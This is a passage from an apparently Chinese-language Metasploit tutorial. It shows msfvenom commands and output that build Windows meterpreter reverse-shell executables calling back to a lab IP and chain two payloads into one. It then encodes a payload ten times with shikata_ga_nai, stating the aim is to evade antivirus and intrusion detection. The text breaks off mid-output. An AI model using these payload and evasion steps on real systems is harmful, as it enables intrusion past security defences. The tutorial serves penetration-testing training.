  ```\n\n18. 然后，我们将使用 -c 选项将第一个有效载荷添加到第二个有效载荷中：\n\n```\nroot@kali:~# msfvenom -c First_Payload\
  \ -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5\
  \ -f exe -o multi.exe\nAdding shellcode from First_Payload to the payload\nNo encoder\
  \ or badchars specified, outputting raw payload\nPayload size: 917 bytes\nFinal\
  \ size of exe file: 73802 bytes\nSaved as: multi.exe\nroot@kali:~#\n```\n\n19. 当我们执行有效载荷时，目标机器上会出现一个消息框，我们的监听器上会出现一个新的会话：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_604_0.png)\n\n## 编码器\n\n生成有效载荷只是第一步；如今，诸如入侵检测系统（IDS）、防病毒和反恶意软件等安全产品可以轻松检测到\
  \ MSFvenom 生成的 shellcode。为了帮助我们规避安全检测，我们可以使用编码器对 shellcode 进行编码。\n\n### 如何操作...\n\
  \n- 1. 通过使用 MSFconsole 的 show encoders 选项，或在 Kali Linux 机器上浏览 /usr/share/metasploit-framework/modules/encoders/\
  \ 文件夹，我们可以看到 Metasploit Framework 上所有可用的编码器：\n\n```\nmsf > show encoders\n```\n\n\
  - 2. 要对我们之前的有效载荷之一进行编码，我们只需添加 -e 选项，后跟我们想要使用的编码器，如果需要，我们还可以使用 -i 选项，后跟编码有效载荷的次数：\n\
  \n```\nmsf > msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.216.5 -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe\n[*] exec:\
  \ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5\
  \ -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe\n\nFound 1 compatible encoders\n\
  Attempting to encode payload with 10 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai\
  \ succeeded with size 360 (iteration=0)\nx86/shikata_ga_nai succeeded with size\
  \ 387 (iteration=1)\nx86/shikata_ga_nai succeeded with size 414 (iteration=2)\n\
  x86/shikata_ga_nai succeeded with size 441 (iteration=3)\nx86/shikata_ga_nai succeeded\
  \ with size 468 (iteration=4)\nx86/shikata_ga_nai succeeded with size 495 (iteration=5)\n\
  x86/shikata_ga_nai succeeded with size 522 (iteration=6)\nx86/shikata_ga_nai succeeded\
  \ with size 549 (iteration=7)\nx86/shikata_ga_nai succeeded with size 576 (iteration=8)\n\
